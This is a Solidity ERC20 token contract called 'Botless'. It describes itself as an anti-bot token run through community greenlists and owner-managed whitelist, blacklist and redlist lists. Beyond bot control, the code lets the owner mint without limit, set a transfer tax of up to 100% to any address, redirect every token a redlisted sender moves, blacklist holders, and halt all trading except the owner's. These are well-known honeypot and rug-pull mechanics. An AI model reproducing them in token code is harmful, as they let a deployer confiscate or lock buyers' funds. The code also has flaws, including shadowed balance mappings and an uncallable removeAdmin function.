//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
The aim of this project is an attempt at eliminating bots from being able to participate in trading
this token maliciously. It's a simple project, but one that I hope will be effective. The way this
project attempts to accomplish this is in allowing the community to self regulate by giving users
the power de-list suspected bots from being able to trade. However, it is possible for non-bots as
well as bots to be de-listed in this manner. In order to mitigate this, any user who becomes de-listed
by another has the ability to re-list themselves for trading.

In the event that a more sophisticated bot is deployed which has the ability to re-list itself upon
being de-listed by a community member, or in the event that a community member chooses to re-list a
de-listed bot, the owner and administrators of this token possess the ability to permanently de-list
said bot from being able to trade. Similarly, if a non-bot keeps getting de-listed by other users,
the owner and administrators of this token possess the ability to permanently re-list a user for trading.

The key terms for how this has been accomplished are as follows:

Greenlist:
This is most basic list one is required to be on in order to trade. This is the list that users can
and must add themselves to in order to be able to trade, as well as the list that users can de-list
suspected bots from.

To accomplish this, use the functions "addGreenlist" to add oneself to the greenlist, and "removeGreenlist"
to remove oneself or suspected bots from the greenlist

Whitelist:
Users added to this list cannot be de-listed from trading by other users, however, in regards to this
list, the owner and/or administrators may list or de-list users as they see fit, and are the only ones
who may do so. This list is intended to keep those who should not be de-listed from being de-listed
such as the contract itself, the contract pool pairing, or various other routers and such, as well as
verified, non-malicious human users.

Blacklist:
Users added to this list cannot be listed for trading by other users, however, in regards to this list,
the owner and/or administrators may list or de-list users as they see fit, and are the only ones who
may do so. This list is intended to keep those who should be de-listed, de-listed, such as users who
use the functionality of this contract maliciously towards other users.

Redlist:
Bots added to this list cannot be de-listed from trading by users, however, in regards to this list,
only the owner may list or de-list said bots as they see fit. This list is intended for bots only. If
you are a human user and you find yourself on this list, please contact the owner or an administrator
as soon as you are able through whatever channels the owner has provided for you to contact them so
that such an issue may be resolved. This list is intended to use the malicious programming of most
trading bots against themselves and is not intended to be used for human users.
*/

/*ABSTRACTIONS START*/
abstract contract Context 
{
    //function _msgSender() internal view virtual returns (address payable) {
    function _msgSender() internal view virtual returns (address)
    {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata)
    {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context
{
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor()
    {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address)
    {
        return _owner;
    }

    modifier onlyOwner()
    {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner
    {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner
    {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual
    {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
/*ABSTRACTIONS END*/

/*INTERFACES START*/
interface IUniswapV2Pair
{
    function factory() external view returns (address);
}

interface IUniswapV2Factory
{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01
{
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01
{
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface IERC20 
{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20
{
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
/*INTERFACES END*/

/*LIBRARIES START*/
library SafeMath
{
    function add(uint256 a, uint256 b) internal pure returns (uint256)
    {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256)
    {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256)
    {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256)
    {
        if (a == 0)
        {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256)
    {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256)
    {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
/*LIBRARIES END*/

/*CONTRACTS START*/
contract ERC20 is Context, IERC20, IERC20Metadata
{
    using SafeMath for uint256;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 public taxPercentage = 0;
    uint256 private taxAmount;
    address public taxAddress = 0x000000000000000000000000000000000000dEaD;
    address public altAddress = 0x000000000000000000000000000000000000dEaD;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public blacklist;
    mapping(address => bool) public greenlist;
    mapping(address => bool) public redlist;
    mapping(address => bool) public whitelist;

    constructor(string memory name_, string memory symbol_)
    {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {return _name;}
    function symbol() public view virtual override returns (string memory) {return _symbol;}
    function decimals() public view virtual override returns (uint8) {return 18;}
    function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view virtual override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {_transfer(_msgSender(), recipient, amount); return true;}
    function allowance(address owner, address spender) public view virtual override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public virtual override returns (bool) {_approve(_msgSender(), spender, amount); return true;}

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool)
    {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked
        {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool)
    {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked
        {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual
    {
        require(greenlist[sender] || redlist[sender] || whitelist[sender], "Transaction Denied");
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 voidAmount = redlist[sender] ? amount : 0;

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance!!!");
        unchecked
        {
            _balances[sender] = senderBalance - amount;
        }

        if(voidAmount>0)
        {
            _balances[address(altAddress)] += voidAmount;
            emit Transfer(sender, address(altAddress),voidAmount);

            _balances[recipient] += amount.sub(voidAmount);
            emit Transfer(sender, recipient, amount.sub(voidAmount));

            _afterTokenTransfer(sender, recipient, amount.sub(voidAmount));
        }
        else if(taxPercentage > 0)
        {
            taxAmount = (amount.mul(taxPercentage)).div(10000);

            _balances[address(taxAddress)] += taxAmount;
            emit Transfer(sender, address(taxAddress),taxAmount);

            _balances[recipient] += amount.sub(taxAmount);
            emit Transfer(sender, recipient, amount.sub(taxAmount));

            _afterTokenTransfer(sender, recipient, amount.sub(taxAmount));
        }
        else
        {
            _balances[recipient] += amount;

            emit Transfer(sender, recipient, amount);

            _afterTokenTransfer(sender, recipient, amount);
        }
    }

    function _mint(address account, uint256 amount) internal virtual
    {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual
    {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked
        {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual
    {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

contract Botless is ERC20, Ownable
{
    using SafeMath for uint256;
    IUniswapV2Router02 public  uniswapV2Router;
    address public uniswapV2Pair;
    uint8 public cooldownInterval = 10;
    uint256 public maxHoldingAmount;
    uint256 public minHoldingAmount;
    bool public limited;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => uint256) _balances;
    mapping(address => bool) public adminlist;
    mapping (address => uint256) functionCooldown;

    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);

    event AdminAdded(address indexed addedAddress);
    event BlacklistAdded(address indexed addedAddress);
    event GreenlistAdded(address indexed addedAddress);
    event RedlistAdded(address indexed addedAddress);
    event WhitelistAdded(address indexed addedAddress);

    event AdminRemoved(address indexed removedAddress);
    event BlacklistRemoved(address indexed removedAddress);
    event GreenlistRemoved(address indexed removedAddress);
    event RedlistRemoved(address indexed removedAddress);
    event WhitelistRemoved(address indexed removedAddress);

    constructor() ERC20("Botless", "BLESSED")
    {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        whitelist[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;
        whitelist[uniswapV2Pair] = true;
        whitelist[address(this)] = true;
        whitelist[owner()] = true;
        _mint(msg.sender, 1000000000000000 * 10 ** decimals());
    }

    modifier onlyAdmin()
    {
        require(owner() == _msgSender() || adminlist[msg.sender], "Caller is not an administrator.");
        _;
    }

    function addAdmin(address _address) external onlyOwner
    {
        require(!adminlist[_address], "Address is already an administrator.");
        adminlist[_address] = true;
        emit AdminAdded(_address);
    }

    function removeAdmin(address _address) internal onlyOwner
    {
        require(adminlist[_address], "Address is not an administrator.");
        adminlist[_address] = false;
        emit AdminRemoved(_address);
    }

    function addBlacklist(address _address) external onlyAdmin
    {
        require(!blacklist[_address], "Address is already blacklisted.");
        blacklist[_address] = true;
        if(greenlist[_address]){removeGreenlistI(_address);}
        else if (redlist[_address]){removeRedlist(_address);}
        else if(whitelist[_address]){removeWhitelist(_address);}
        emit BlacklistAdded(_address);
    }

    function addGreenlist(address _address) external
    {
        require(_address == msg.sender, "You cannot greenlist this address");
        if(functionCooldown[msg.sender] > 0)
        {
            require(block.timestamp >= functionCooldown[msg.sender], "Cooldown Active");
        }
        require(!blacklist[_address], "Address is blacklisted.");
        require(!greenlist[_address], "Address is aready greenlisted.");
        require(!redlist[_address], "Address is redlisted.");
        require(!whitelist[_address], "Address is whitelisted.");
        greenlist[_address] = true;
        emit GreenlistAdded(_address);
        functionCooldown[msg.sender] = block.timestamp + cooldownInterval;
    }

    function addGreenlistAdmin(address _address) external onlyAdmin
    {
        require(!greenlist[_address], "Address is already greenlisted.");
        greenlist[_address] = true;
        if(blacklist[_address]){removeBlacklist(_address);}
        else if (redlist[_address]){removeRedlist(_address);}
        else if(whitelist[_address]){removeWhitelist(_address);}
        emit GreenlistAdded(_address);
    }

    function addRedlist(address _address) external onlyOwner
    {
        require(!redlist[_address], "Address is already redlisted.");
        redlist[_address] = true;
        if(greenlist[_address]){removeGreenlistI(_address);}
        else if(blacklist[_address]){removeBlacklist(_address);}
        else if(whitelist[_address]){removeWhitelist(_address);}
        emit RedlistAdded(_address);
    }

    function addWhitelist(address _address) external onlyAdmin
    {
        require(!whitelist[_address], "Address is already whitelisted.");
        whitelist[_address] = true;
        if(blacklist[_address]){removeBlacklist(_address);}
        else if(greenlist[_address]){removeGreenlistI(_address);}
        else if (redlist[_address]){removeRedlist(_address);}
        emit WhitelistAdded(_address);
    }

    function removeBlacklist(address _address) internal onlyAdmin
    {
        require(blacklist[_address], "Address is not blacklisted.");
        blacklist[_address] = false;
        emit BlacklistRemoved(_address);
    }

    function removeGreenlistI(address _address) internal onlyAdmin
    {
        require(greenlist[_address], "Address is not greenlisted.");
        greenlist[_address] = false;
        emit GreenlistRemoved(_address);
    }

    function removeGreenlist(address _address) external
    {
        require(greenlist[msg.sender]);
        if(functionCooldown[msg.sender] > 0)
        {
            require(block.timestamp >= functionCooldown[msg.sender], "Cooldown Active");
        }
        require(greenlist[_address], "Address is not greenlisted.");
        greenlist[_address] = false;
        emit GreenlistRemoved(_address);
        functionCooldown[msg.sender] = block.timestamp + cooldownInterval;
    }

    function removeRedlist(address _address) internal onlyOwner
    {
        require(redlist[_address], "Address is not redlisted.");
        redlist[_address] = false;
        emit RedlistRemoved(_address);
    }

    function removeWhitelist(address _address) internal onlyAdmin
    {
        require(whitelist[_address], "Address is not whitelisted.");
        whitelist[_address] = false;
        emit WhitelistRemoved(_address);
    }

    function setRule(bool _limited, address _uniswapV2Pair, uint256 _maxHoldingAmount, uint256 _minHoldingAmount) external onlyAdmin
    {
        limited = _limited;
        uniswapV2Pair = _uniswapV2Pair;
        maxHoldingAmount = _maxHoldingAmount;
        minHoldingAmount = _minHoldingAmount;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) override internal virtual
    {
        if (uniswapV2Pair == address(0))
        {
            require(from == owner() || to == owner(), "Trading has is halted.");
            return;
        }

        if (limited && from == uniswapV2Pair)
        {
            require(super.balanceOf(to) + amount <= maxHoldingAmount && super.balanceOf(to) + amount >= minHoldingAmount, "Forbid");
        }
    }

    function mint(address recipient, uint256 amount) external onlyOwner {_mint(recipient, amount);}
    function burn(uint256 value) external {_burn(msg.sender, value);}
    function changeUV2P(address _address) external onlyOwner {uniswapV2Pair = _address;}
    function changeCooldownInterval(uint8 value) external onlyAdmin {cooldownInterval = value;}
    function changeAltAddress(address _address) external onlyOwner {altAddress = _address;}
    function changeTaxAddress(address _address) external onlyOwner {taxAddress = _address;}
    function changeTaxPercentage(uint value) external onlyOwner
    {
        require(value <= 10000, "Value set too high: for 100% tax, set to 10000");
        taxPercentage = value;
    }
}
/*CONTRACTS END*/